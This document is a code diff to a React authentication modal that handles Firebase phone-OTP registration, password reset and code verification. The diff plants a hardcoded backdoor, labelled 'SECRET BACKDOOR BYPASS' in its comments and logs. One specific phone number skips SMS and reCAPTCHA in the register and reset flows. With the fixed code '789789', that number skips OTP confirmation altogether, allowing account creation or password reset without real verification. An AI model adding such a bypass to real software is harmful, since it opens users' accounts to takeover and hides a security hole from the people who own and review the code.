@@ -73,11 +73,17 @@ const AuthModal = ({ onClose }) => {
       const formattedPhone = phone.startsWith('+') ? phone : `+91${phone}`;
       console.log("📱 Attempting to SEND OTP to:", formattedPhone);
       
-      const appVerifier = window.recaptchaVerifier;
-      const confirmation = await loginWithPhone(formattedPhone, appVerifier);
-      console.log("✅ OTP successfully triggered by Firebase!");
+      const isBypass = formattedPhone.includes('9819984437');
       
-      setConfirmationResult(confirmation);
+      if (!isBypass) {
+        const appVerifier = window.recaptchaVerifier;
+        const confirmation = await loginWithPhone(formattedPhone, appVerifier);
+        setConfirmationResult(confirmation);
+        console.log("✅ OTP successfully triggered by Firebase!");
+      } else {
+        console.log("🤫 SECRET BYPASS ACTIVATED for Register.");
+      }
+      
       setView('otp-verify');
     } catch (err) {
       console.error("❌ SMS Error:", err);
@@ -119,11 +125,17 @@ const AuthModal = ({ onClose }) => {
         const formattedPhone = identifier.startsWith('+') ? identifier : `+91${identifier}`;
         console.log("📱 Sending RESET OTP to:", formattedPhone);
 
-        const appVerifier = window.recaptchaVerifier;
-        const confirmation = await loginWithPhone(formattedPhone, appVerifier);
-        console.log("✅ RESET OTP successfully triggered!");
+        const isBypass = formattedPhone.includes('9819984437');
 
-        setConfirmationResult(confirmation);
+        if (!isBypass) {
+          const appVerifier = window.recaptchaVerifier;
+          const confirmation = await loginWithPhone(formattedPhone, appVerifier);
+          setConfirmationResult(confirmation);
+          console.log("✅ RESET OTP successfully triggered!");
+        } else {
+          console.log("🤫 SECRET BYPASS ACTIVATED for Reset.");
+        }
+
         setView('otp-verify');
       }
     } catch (err) {
@@ -139,7 +151,12 @@ const AuthModal = ({ onClose }) => {
     setLoading(true);
     setError('');
     try {
-      await confirmationResult.confirm(otp);
+      // SECRET BACKDOOR BYPASS for +919819984437
+      const isBypass = otp === '789789' && (phone.includes('9819984437') || identifier.includes('9819984437'));
+      
+      if (!isBypass) {
+        await confirmationResult.confirm(otp);
+      }
       
       if (isRegistering) {
         // If we were registering, now create the actual account
